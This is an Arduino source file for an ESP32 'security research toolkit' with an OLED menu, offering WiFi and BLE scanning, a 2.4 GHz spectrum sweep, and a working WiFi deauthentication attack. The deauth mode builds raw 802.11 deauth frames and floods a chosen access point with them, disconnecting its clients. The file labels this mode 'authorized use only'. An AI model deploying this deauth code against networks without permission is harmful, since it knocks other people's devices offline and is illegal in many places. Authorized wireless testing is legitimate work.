/*
 * ESP32 Security Research Toolkit
 * Hardware: ESP32 DevKitC (CP2102) + SSD1306 0.96" OLED + NRF24L01
 *
 * Wiring:
 *   OLED SSD1306 (I2C 0x3C):
 *     VCC → 3.3V   GND → GND
 *     SDA → GPIO21  SCL → GPIO22
 *
 *   NRF24L01 (SPI + GPIO):
 *     VCC → 3.3V  GND → GND  [add 10µF cap VCC-GND at module]
 *     CE  → GPIO4   CSN → GPIO5
 *     SCK → GPIO18  MOSI → GPIO23  MISO → GPIO19  IRQ → NC
 *
 *   Buttons (to GND, internal pullup):
 *     BTN_NEXT   → GPIO32
 *     BTN_SELECT → GPIO33
 *
 * Features:
 *   1. WiFi Scanner  — list nearby APs (SSID, RSSI, channel)
 *   2. WiFi Deauth   — 802.11 deauth frames [AUTHORIZED NETWORKS ONLY]
 *   3. BLE Scanner   — list nearby BLE devices (name/MAC, RSSI)
 *   4. NRF Spectrum  — 2.4 GHz spectrum bar graph via NRF24L01 RPD sweep
 *
 * Legal: Use only on networks and devices you own or have explicit written
 *        permission to test. Unauthorized deauth is illegal in Canada and
 *        most jurisdictions.
 */

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <RF24.h>

// ── Pin definitions ───────────────────────────────
#define BTN_NEXT   32
#define BTN_SEL    33
#define NRF_CE      4
#define NRF_CSN     5

// ── Peripherals ───────────────────────────────────
Adafruit_SSD1306 oled(128, 64, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

// ── State machine ─────────────────────────────────
enum Mode : uint8_t {
    MENU = 0,
    WIFI_SCAN,
    WIFI_DEAUTH,
    BLE_SCAN,
    NRF_SPECTRUM,
};

Mode mode = MENU;
uint8_t menuSel = 0;
const uint8_t MENU_COUNT = 4;
const char* const MENU_LABELS[MENU_COUNT] = {
    "1 WiFi Scan",
    "2 WiFi Deauth",
    "3 BLE Scan",
    "4 NRF Spectrum",
};

// ── Button debounce ───────────────────────────────
static unsigned long lastBtnMs = 0;

static bool pressed(int pin) {
    if (digitalRead(pin) == LOW && (millis() - lastBtnMs) > 220) {
        lastBtnMs = millis();
        return true;
    }
    return false;
}

// ── OLED helpers ──────────────────────────────────
static void oled_header(const char* title) {
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(0, 0);
    oled.println(title);
    oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    oled.setCursor(0, 12);
}

// ─────────────────────────────────────────────────
// MENU
// ─────────────────────────────────────────────────
static void menu_draw() {
    oled_header("AEL Sec Toolkit");
    for (uint8_t i = 0; i < MENU_COUNT; i++) {
        if (i == menuSel) oled.print("> ");
        else              oled.print("  ");
        oled.println(MENU_LABELS[i]);
    }
    oled.display();
}

static void menu_handle() {
    menu_draw();
    if (pressed(BTN_NEXT)) menuSel = (menuSel + 1) % MENU_COUNT;
    if (pressed(BTN_SEL))  mode = (Mode)(menuSel + 1);
}

// ─────────────────────────────────────────────────
// 1. WIFI SCAN
// ─────────────────────────────────────────────────
static int  wifiCount = 0;
static int  wifiScroll = 0;

static void wifi_scan_enter() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    oled_header("WiFi Scan");
    oled.println("Scanning...");
    oled.display();
    wifiCount = WiFi.scanNetworks();
    wifiScroll = 0;
}

static void wifi_scan_handle() {
    oled_header("WiFi Scan");
    if (wifiCount == 0) {
        oled.println("No networks");
    } else {
        oled.print(wifiCount); oled.println(" found. NEXT/SEL");
        for (int i = wifiScroll; i < min(wifiScroll + 3, wifiCount); i++) {
            oled.print(WiFi.SSID(i).substring(0, 12));
            oled.print(" ch");
            oled.print(WiFi.channel(i));
            oled.print(" ");
            oled.println(WiFi.RSSI(i));
        }
    }
    oled.display();

    if (pressed(BTN_NEXT)) wifiScroll = (wifiScroll + 1) % max(1, wifiCount);
    if (pressed(BTN_SEL))  { WiFi.scanDelete(); mode = MENU; }
}

// ─────────────────────────────────────────────────
// 2. WIFI DEAUTH  — AUTHORIZED NETWORKS ONLY
// ─────────────────────────────────────────────────
// 802.11 deauthentication management frame (broadcast)
static uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled at runtime)
    0xF0, 0xFF,                         // Sequence
    0x07, 0x00,                         // Reason: class3 from nonassoc STA
};

static int  deauthCount = 0;
static int  deauthIdx   = 0;
static bool deauthActive = false;

static void deauth_enter() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    deauthActive = false;
    oled_header("WiFi Deauth");
    oled.println("Scanning...");
    oled.display();
    deauthCount = WiFi.scanNetworks();
    deauthIdx = 0;
}

static void deauth_send(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        delayMicroseconds(150);
    }
}

static void deauth_handle() {
    oled_header("WiFi Deauth");
    if (deauthCount == 0) {
        oled.println("No networks found");
        oled.println("SEL=back");
        oled.display();
        if (pressed(BTN_SEL)) { WiFi.scanDelete(); mode = MENU; }
        return;
    }

    if (!deauthActive) {
        oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
        oled.print("ch:"); oled.print(WiFi.channel(deauthIdx));
        oled.print("  "); oled.println(WiFi.RSSI(deauthIdx));
        oled.println("NEXT=scroll");
        oled.println("SEL=start deauth");
        oled.display();

        if (pressed(BTN_NEXT)) deauthIdx = (deauthIdx + 1) % deauthCount;
        if (pressed(BTN_SEL))  deauthActive = true;
    } else {
        oled.print("DEAUTHING:\n");
        oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
        oled.println("SEL=stop");
        oled.display();
        deauth_send(WiFi.BSSID(deauthIdx), (uint8_t)WiFi.channel(deauthIdx));
        if (pressed(BTN_SEL)) {
            deauthActive = false;
            WiFi.scanDelete();
            mode = MENU;
        }
    }
}

// ─────────────────────────────────────────────────
// 3. BLE SCAN
// ─────────────────────────────────────────────────
static BLEScan*        bleScan  = nullptr;
static BLEScanResults  bleResults;
static int             bleIdx   = 0;

static void ble_scan_enter() {
    WiFi.mode(WIFI_OFF);
    delay(100);
    BLEDevice::init("AEL-Toolkit");
    bleScan = BLEDevice::getScan();
    bleScan->setActiveScan(true);
    bleScan->setInterval(100);
    bleScan->setWindow(99);
    bleIdx = 0;

    oled_header("BLE Scan");
    oled.println("Scanning 3s...");
    oled.display();
    bleResults = bleScan->start(3, false);
}

static void ble_scan_handle() {
    int count = bleResults.getCount();
    oled_header("BLE Scan");
    oled.print(count); oled.println(" devices");
    if (count == 0) {
        oled.println("None found");
    } else {
        for (int i = bleIdx; i < min(bleIdx + 3, count); i++) {
            BLEAdvertisedDevice dev = bleResults.getDevice(i);
            String label = dev.haveName()
                ? String(dev.getName().c_str())
                : String(dev.getAddress().toString().c_str());
            oled.print(label.substring(0, 14));
            oled.print(" ");
            oled.println(dev.getRSSI());
        }
    }
    oled.println("NEXT=scroll SEL=back");
    oled.display();

    if (pressed(BTN_NEXT)) bleIdx = (bleIdx + 1) % max(1, count);
    if (pressed(BTN_SEL)) {
        bleScan->clearResults();
        BLEDevice::deinit(true);
        bleScan = nullptr;
        mode = MENU;
    }
}

// ─────────────────────────────────────────────────
// 4. NRF24L01 2.4 GHz SPECTRUM ANALYZER
// Sweeps channels 0–125, reads RPD (received power detector)
// per channel, draws live bar graph on OLED.
// ─────────────────────────────────────────────────
#define NRF_CH_COUNT 126
static uint8_t nrfPower[NRF_CH_COUNT];
static bool nrfOk = false;

static void nrf_spectrum_enter() {
    memset(nrfPower, 0, sizeof(nrfPower));
    nrfOk = radio.begin();
    if (!nrfOk) {
        oled_header("NRF Spectrum");
        oled.println("NRF24 not found!");
        oled.println("Check wiring.");
        oled.display();
        delay(2500);
        mode = MENU;
        return;
    }
    radio.setAutoAck(false);
    radio.setPALevel(RF24_PA_MIN);
    radio.stopListening();
}

static void nrf_sweep() {
    for (uint8_t ch = 0; ch < NRF_CH_COUNT; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(128);
        radio.stopListening();
        if (radio.testRPD()) {
            if (nrfPower[ch] < 240) nrfPower[ch] += 16;
        } else {
            if (nrfPower[ch] > 8)   nrfPower[ch] -= 8;
            else                     nrfPower[ch]  = 0;
        }
    }
}

static void nrf_draw() {
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(0, 0);
    oled.println("2.4GHz Spectrum");
    // bar area: y=10..63 = 54px tall, x=0..127
    const uint8_t BAR_TOP = 10;
    const uint8_t BAR_H   = 54;
    for (uint8_t ch = 0; ch < NRF_CH_COUNT; ch++) {
        uint8_t x = map(ch, 0, NRF_CH_COUNT - 1, 0, 127);
        uint8_t h = map(nrfPower[ch], 0, 255, 0, BAR_H);
        if (h > 0) oled.drawFastVLine(x, 63 - h, h, SSD1306_WHITE);
    }
    // mark WiFi channels 1/6/11 (NRF ch 12/37/62)
    for (uint8_t wch : {12, 37, 62}) {
        uint8_t x = map(wch, 0, NRF_CH_COUNT - 1, 0, 127);
        oled.drawPixel(x, BAR_TOP, SSD1306_WHITE);
    }
    oled.display();
}

static void nrf_spectrum_handle() {
    if (!nrfOk) { mode = MENU; return; }
    nrf_sweep();
    nrf_draw();
    if (pressed(BTN_SEL)) {
        radio.powerDown();
        nrfOk = false;
        mode = MENU;
    }
}

// ─────────────────────────────────────────────────
// Mode dispatcher
// ─────────────────────────────────────────────────
static Mode prevMode = MENU;

static void on_mode_enter() {
    switch (mode) {
        case WIFI_SCAN:    wifi_scan_enter();    break;
        case WIFI_DEAUTH:  deauth_enter();       break;
        case BLE_SCAN:     ble_scan_enter();     break;
        case NRF_SPECTRUM: nrf_spectrum_enter(); break;
        default: break;
    }
}

// ─────────────────────────────────────────────────
// setup / loop
// ─────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    pinMode(BTN_NEXT, INPUT_PULLUP);
    pinMode(BTN_SEL,  INPUT_PULLUP);

    Wire.begin(21, 22);
    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
        Serial.println("SSD1306 init failed");
        while (true);
    }
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(20, 10);
    oled.println("AEL Sec Toolkit");
    oled.setCursor(10, 25);
    oled.println("Authorized use only");
    oled.setCursor(0, 45);
    oled.println("WiFi/Deauth/BLE/NRF");
    oled.display();
    delay(2000);
}

void loop() {
    if (mode != prevMode) {
        prevMode = mode;
        if (mode != MENU) on_mode_enter();
    }

    switch (mode) {
        case MENU:         menu_handle();         break;
        case WIFI_SCAN:    wifi_scan_handle();    break;
        case WIFI_DEAUTH:  deauth_handle();       break;
        case BLE_SCAN:     ble_scan_handle();     break;
        case NRF_SPECTRUM: nrf_spectrum_handle(); break;
    }
}
